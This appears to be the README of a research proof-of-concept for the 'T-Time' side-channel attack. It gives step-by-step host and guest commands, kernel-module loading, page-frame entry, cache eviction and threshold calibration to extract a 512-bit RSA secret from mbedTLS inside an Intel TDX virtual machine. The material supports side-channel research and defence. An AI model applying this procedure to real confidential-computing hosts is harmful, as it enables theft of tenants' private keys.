# evaluation_mbedtls

In this folder, we describe how the T-Time attack is used to infer secret keys within mbedTLS.

(You can refer the video Ttime_mbedtls.mp4 in this folder)

**brief description**

In this experiment, we perform an attack that infers secret values inside the mbedtls_mpi_exp_mod function of mbedTLS version 3.5.2.

For experimental purposes, we manually compiled all required libraries and header files, and included only the necessary components for the experiment.

mbedtls : [https://github.com/Mbed-TLS/mbedtls/releases/tag/v3.5.2](https://github.com/Mbed-TLS/mbedtls/releases/tag/v3.5.2)

libwebp : [https://github.com/webmproject/libwebp/releases/tag/v1.5.0](https://github.com/webmproject/libwebp/releases/tag/v1.5.0)

The versions of gcc and g++ used during compilation are as follows

```bash
gcc (Ubuntu 13.3.0-6ubuntu2~24.04) 13.3.0
Copyright (C) 2023 Free Software Foundation, Inc.
This is free software; see the source for copying conditions.  There is NO
warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.

g++ (Ubuntu 13.3.0-6ubuntu2~24.04) 13.3.0
Copyright (C) 2023 Free Software Foundation, Inc.
This is free software; see the source for copying conditions.  There is NO
warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.

ldd (Ubuntu GLIBC 2.39-0ubuntu8.4) 2.39
Copyright (C) 2024 Free Software Foundation, Inc.
This is free software; see the source for copying conditions.  There is NO
warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
Written by Roland McGrath and Ulrich Drepper.
```

Please note that detailed code explanations is currently under development and is not included in this release.

The explanation will proceed by alternating between the host and TD (VM) perspectives.

1. **VM perspective**

Navigate to the T-Time_poc_vm/evaluation_mbedtls directory and run the [build.sh](http://build.sh/) script.

Then, execute the print_address program. You should see output similar to the following:

```bash
root@tdx-guest:~/VM/T-Time_poc_vm/evaluation_mbedtls# ./print_address 
Matching library:
Backed by:	/root/VM/T-Time_poc_vm/evaluation_mbedtls/library/libmbedcrypto.so.15
Range:		0x7ffff7f44000-0x7ffff7f93000
Length:		323584
Offset:		98304
Permissions:	r-xp
Inode:		262915
Device:		fd:01

Code Location mpi_select               : vaddr=0x7ffff7f4f000, paddr=0x1309e000 [pfn 0x1309e]
Code Location mpi_core_montmul         : vaddr=0x7ffff7f53000, paddr=0x1c391000 [pfn 0x1c391]
Code Location mbedtls_mpi_exp_mod      : vaddr=0x7ffff7f51000, paddr=0x1a208000 [pfn 0x1a208]
```

Take note of the PFNs (Page Frame Numbers) displayed in the output:

- mpi_select: 0x1309e
- mpi_core_montmul: 0x1c391
- mbedtls_mpi_exp_mod: 0x1a208

1. **Host perspective**

Navigate to the T-Time_poc_host/poc/evaluation_mbedtls directory and run the [setting.sh](http://setting.sh/) script

This script is configured to automatically evict the cache line corresponding to the instruction code for secret key bit 1.

When prompted, input the PFNs you previously noted from the virtual machine output:

- mpi_select
- mpi_core_montmul
- mbedtls_mpi_exp_mod

```bash
root@tdx:/home/csl/HOST/T-Time/attack/T-Time_poc_host/poc/evaluation_mbedtls# ./setting.sh 
Loading remove.ko from /home/csl/HOST/T-Time/attack/T-Time_poc_host/script/../module/removelist...
Unloading remove...
Loading flushremove.ko from /home/csl/HOST/T-Time/attack/T-Time_poc_host/script/../module/flushremovelist...
Unloading flushremove...
flushremove.ko successfully unloaded.
Enter guest PFN for (mpi_select) (e.g., 0x1234): 0x1309e
Enter guest PFN for (mpi_montmul) (e.g., 0x1234): 0x1c391
Enter guest PFN for (mpi_exp) (e.g., 0x1234): 0x1a208
```

After completing this step, you will be able to see the block page list and the addresses to flush as shown below.

```bash
---------------------------------------
Loading allprint.ko from /home/csl/HOST/T-Time/attack/T-Time_poc_host/script/../module/printlist...
Unloading allprint...
allprint.ko successfully unloaded.
[ 1195.570798] VM process found: qemu-system-x86 (PID: 2779)
[ 1195.570805] Running woomin_list_print and woomin_flush_list_print...
[ 1195.570807] [woomin_list_print] woomin_list[0][mpi_select] = 0x1309e (blocked = 1)
[ 1195.570809] [woomin_list_print] woomin_list[1][mpi_core_montmul] = 0x1c391 (blocked = 1)
[ 1195.570811] [woomin_list_print] woomin_list[2][mbedtls_mpi_exp_mod] = 0x1a208 (blocked = 1)
[ 1195.570812] [woomin_flush_list] woomin_flush list[0] = 0x1a208b6e (VA : 0xff116453c7208b6e)
[ 1195.570814] [woomin_flush_list] woomin_flush list[1] = 0x1a208bae (VA : 0xff116453c7208bae)
[ 1195.580059] Exiting TDX Print Module
---------------------------------------

```

1. **Host perspective**

Navigate to the T-Time_poc_host/poc/evaluation_mbedtls/threshold directory and run the [capture.sh](http://capture.sh/) script

**Important:** Wait until the following message appears before proceeding:

```bash
execute the target program ! 
```

1. **VM perspective**

Run the threshold program.

**Important:** Wait until the following message is displayed:

```bash
threshold done!
```

**Note**: This process may take approximately 4–5 minutes.

1. **Host perspective**

Terminate the program by pressing Ctrl + C. Then, run the [threshold.sh](http://threshold.sh/) script

This script automatically measures and adjusts the threshold required to extract the secret key from mbedTLS.

After that, navigate to the T-Time_poc_host/poc/evaluation_mbedtls/parse directory and run the [capture.sh](http://capture.sh/) script

**Important:** Wait until the following message appears before proceeding:

```bash
execute the target program ! 
```

1. **VM perspective**

Run the mbedtls_expont program.

**Important:** Wait until the following message appears before proceeding:

```bash
RSA exponent calculation !
```

**Note**: This process may take approximately 1–2 minutes.

1. **Host perspective**

Terminate the program by pressing Ctrl + C. Then, run the [bitscript.sh](http://bitscript.sh/) script:

The extracted secret bits are compared against the right **512-bit private secret key**.

If the extracted bits match, the following message will be displayed:

```bash
1101010110101101000010001010011010001010011101110101100111011100101000000001111010010110011100101111100111000001110111000010011111101010010100001011000100010011101010011001101100111000001100011001101000011110111010111100111100100000101000010010010101000010001000001101011010110101100100100011110011010111000100001000101100110101111100011100001110111110001001110010001001011001010100111111001010100001110110011011100000101100110001110111000111010110101011100011101011010010110111110000110101010011100010010100001
All secret bits match perfectly.
```